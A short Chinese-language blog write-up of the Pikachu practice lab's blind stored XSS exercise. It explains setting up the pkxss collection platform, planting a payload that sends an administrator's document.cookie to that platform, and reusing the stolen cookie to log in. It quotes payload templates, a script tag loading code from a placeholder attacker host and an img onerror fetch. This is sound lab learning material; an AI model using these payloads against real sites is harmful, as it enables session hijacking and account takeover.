---
title: Pikachu-XSS盲打
date: 2026-11-23
tags: [Pikachu, WEB, XSS]
excerpt: payload 提交给自己看不到，得让管理员访问，用 pkxss 后台收 cookie。
---

思路：盲打是"payload 存在后台页面里，但它什么时候被管理员看到你不知道"。所以不能靠弹窗验证，要搭一个接收平台，等管理员访问时把 cookie 带回来。

问题：
1. 提交了 payload，自己看不到效果，不知道成没成功。
2. 不知道怎么接收数据。
3. pkxss 后台的配置文件不知道改哪里。

解决：
1. 先启动 Pikachu 自带的 pkxss 平台，改配置里的地址和数据库。
2. 在留言板等位置提交 payload，让页面去加载 pkxss 的接口，把 document.cookie 带出去。
3. 到 pkxss 后台看有没有收到请求、cookie 值是什么。
4. 用拿到的 cookie 登录后台，提交通过。

补充：
1. 盲打平台可以用 Pikachu 自带的 pkxss，也可以自己搭（一个接收脚本 + 一个展示页面）。
2. payload 常见形式：<script src="http://攻击端/x.js"></script>，或者 <img src=x onerror="fetch(...)">。
3. 这道题的重点是理解"盲"——你要靠第三方观测结果，而不是自己的浏览器。

工具：pkxss 平台、Burp Suite、浏览器

踩坑记录：
1. 一开始只提交不观测，完全不知道有没有打中。
2. pkxss 的地址写成 127.0.0.1，跨机器访问不到，改成实际 IP 才行。
3. cookie 拿到了但没意识到要替换到自己浏览器里再访问后台。

总结：盲打题考的是"链路完整性"：payload 要能被存储、被渲染、被执行、能回连、平台能收到。任何一环断了都白打。
